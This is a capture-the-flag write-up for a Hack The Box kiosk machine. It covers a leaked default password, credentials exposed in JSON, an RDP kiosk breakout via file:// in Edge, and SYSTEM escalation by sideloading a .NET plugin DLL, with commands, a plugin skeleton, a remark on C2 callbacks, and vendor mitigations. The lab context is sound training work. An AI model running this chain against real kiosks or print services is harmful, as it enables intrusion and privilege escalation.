# Touch — HTB Write-up

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Touch (Windows / Release Arena — kiosk + vendor print stack)  
**Date:** 2026-10-04  
**Scope:** HTB VPN / personal lab only  

> **No flags** and **no live passwords** in this document. Placeholders: `<TARGET_IP>`, `<SERIAL>`, `<KIOSK_PASS>`.

---

## TL;DR

```
HTTPS DeviceHub :8443
  → GET /api/status leaks device serial
  → serial == default portal password (login hint)
  → scanner/printer JSON still embeds deviceUser / devicePass
  → RDP as KioskUser (/sec:rdp, NLA off)
  → POST /api/scanner/power {powered:false}
  → kiosk SCAN BADGE native error → Edge → file:///C:\Windows\System32\cmd.exe
  → drop managed DLL into NexionPrinter plugins\
  → POST /api/printer/restart writes ProgramData trigger
  → LoadFrom + public Initialize() inside the print service (SYSTEM)
```

| Phase | Vector | Identity |
|-------|--------|----------|
| Recon | DeviceHub HTTPS, unauth `/api/status` | — |
| Auth | serial as DeviceHub password; creds reused in DOM/JSON | portal cookie |
| User | RDP kiosk + scanner-off error dialog → Edge `file://` | `KioskUser` |
| Root | `Printer Administrators` Modify on `plugins\` + `Assembly.LoadFrom` | **SYSTEM** |

---

## 1. Recon

Box looks like an airport gate kiosk: passport scanner (Nexion DocReader SR-4200) + boarding-pass printer (Nexion TP-820) behind **Nexion DeviceHub DH-100** (“Gate B7 — Kiosk #042”, Service v4.2.1).

HTTP stack is `Microsoft-HTTPAPI/2.0` (HTTP.sys), not IIS Classic. Login is a single password field (`POST /login`, “Device password”). The “Forgot your password?” tooltip states the default is the **device serial** from the packaging.

```bash
nmap -sC -sV -p 3389,8443 <TARGET_IP>
curl -k https://<TARGET_IP>:8443/api/status
```

`GET /api/status` is unauthenticated and returns JSON:

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "<SERIAL>",
  "firmware": "1.4.2",
  "status": "online"
}
```

That serial is the portal password.

---

## 2. DeviceHub after login

Dashboard / Scanner / Printer pages still **embed device credentials in HTML/JSON** (`deviceUser`, `devicePass`) even where the UI shows dots. `/api/scanner` and `/api/printer` return the same pair. Those are the kiosk Windows account, not a second mystery user.

Useful authenticated endpoints:

| Call | Effect |
|------|--------|
| `POST /api/scanner/power` `{"powered":false}` | scanner hardware off |
| `POST /api/printer/power` `{"powered":false}` | printer hardware off |
| `POST /api/printer/restart` | writes `%ProgramData%\Nexion\printer-restart.trigger` — does **not** spawn a new process |

Cookie from `/login` is enough. No extra CSRF token.

---

## 3. User — RDP kiosk breakout

RDP accepts the kiosk account. **NLA is off**; `xfreerdp` needs `/sec:rdp` (plain RDP, not TLS/NLA):

```bash
xfreerdp /v:<TARGET_IP> /u:KioskUser /p:'<KIOSK_PASS>' /sec:rdp /dynamic-resolution
```

Session is a **full-screen kiosk** (badge / scan UI on `localhost:5173`). Alt-Tab and the usual kiosk escapes are cramped. The intended hole is the error path:

1. From DeviceHub (browser on Kali, or the kiosk “staff” portal): power the scanner **off**.
2. On the kiosk UI, hit **SCAN BADGE**.
3. Native error dialog; the support URL opens **Edge**.
4. Address bar: `file:///C:\Windows\System32\cmd.exe` (or `explorer.exe`, then walk the disk).

User flag sits on the kiosk desktop. `KioskUser` is not local admin. Interesting process is the print service, not this session.

---

## 4. What NexionPrinter actually does

Decompiled `NexionPrinter` (net8.0 Windows Desktop, product “Nexion TP-820 Print Service”):

1. On start, and again when `%ProgramData%\Nexion\printer-restart.trigger` appears, call `LoadPlugins()`.
2. Enumerate `AppContext.BaseDirectory\plugins\*.dll`.
3. `Assembly.LoadFrom(path)`.
4. For each exported type with a public `Initialize()`: `Activator.CreateInstance` + `Invoke()`.
5. Swallow exceptions per DLL. Then `while (true)` + 2s sleep, waiting for jobs / the trigger.

```csharp
private static readonly string RestartFile =
    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                 "Nexion", "printer-restart.trigger");

// LoadPlugins: Directory.GetFiles(plugins, "*.dll")
//   Assembly.LoadFrom(path)
//   type.GetMethod("Initialize") != null
//   Activator.CreateInstance(type); method.Invoke(instance, null);
```

`POST /api/printer/restart` only **touches that trigger file**. The already-running service notices it, deletes it, and re-runs `LoadPlugins()`. Identity stays whatever the service is (intended: **SYSTEM**). The kiosk user never needs to be local admin.

`Printer Administrators` had **Modify** on that `plugins` directory. Users were RX. Sideload = drop a managed DLL that exports `Initialize()`, then ask DeviceHub to restart the printer.

Publish dir in lab: under `C:\Program Files\Nexion Systems\` (printer service + `plugins\`). Confirm on-box with:

```bat
dir /s /b "C:\Program Files\Nexion*"
icacls "<publish>\plugins"
```

---

## 5. Root — managed plugin, not a native implant

| Host does | What happens |
|-----------|----------------|
| `LoadFrom` + `Initialize()` / process stays alive | managed plugin runs in the service |
| `LoadLibrary` / rundll32 / AppInit without calling `Initialize` | CLR may map the file; default ctor is empty; implant sleeps |

`DllMain` in strings on a wrapped PIC payload is the **inner shellcode**, not a plugin export. This is a **CLR plugin**, not a native drop.

Contract (minimal):

```csharp
public class PrinterPlugin
{
    public void Initialize() { /* runs in NexionPrinter.exe */ }
}
```

TFM: host is `net8.0`; `netstandard2.0` is enough for `LoadFrom` of a class library with no extra deps. Build with [`scripts/PrinterPlugin.csproj`](scripts/PrinterPlugin.csproj).

Lab plugin (`scripts/PrinterPlugin.cs`):

- appends `Environment.UserName` to `%ProgramData%\Nexion\plugin.log` (and a couple of fallbacks the kiosk can read)
- copies `C:\Users\*\Desktop\root.txt` onto the kiosk desktop / Public (skip `KioskUser`)

```bash
dotnet build scripts/PrinterPlugin.csproj -c Release
# from kiosk cmd:
copy PrinterPlugin.dll "<publish>\plugins\"
# Kali, DeviceHub cookie still valid:
curl -k -b cookies.txt -X POST https://<TARGET_IP>:8443/api/printer/restart
```

Wait ~2s. `plugin.log` should say `USER=SYSTEM`. Root flag is then on the kiosk desktop.

A C2 callback from the same `Initialize()` works **iff** the payload is a managed plugin (or the plugin itself `VirtualAlloc`s PIC and parks in the **service** process). Closing a console host used to kill the callback; a Win32 service does not.

---

## 6. Why this is the box

Same pattern as every “vendor device with a plugin folder”:

- unauth status returns the default password
- device passwords left in HTML/JSON the browser already has in a cookie
- kiosk error dialog opens a real browser with `file://`
- privileged service `LoadFrom`s every `*.dll` in a folder a lesser group can write

Mitigations (for the vendor, not the player): Authenticode-check plugins; ACL `plugins\` to the service account only; do not `LoadFrom` world-writable paths from SYSTEM; enable RDP NLA; block `file://` in the error-dialog browser.

---

## Artifacts (operator leftover, not flags)

| Where | What |
|-------|------|
| `plugins\*.dll` under the printer publish dir | LoadFrom image; unsigned managed PE |
| `%ProgramData%\Nexion\printer-restart.trigger` | written by DeviceHub, deleted by the service |
| `%ProgramData%\Nexion\plugin.log` | proof of `Initialize()` identity |
| 4688 / Sysmon 1 | no new `pwn.exe` if execution stays in-process |
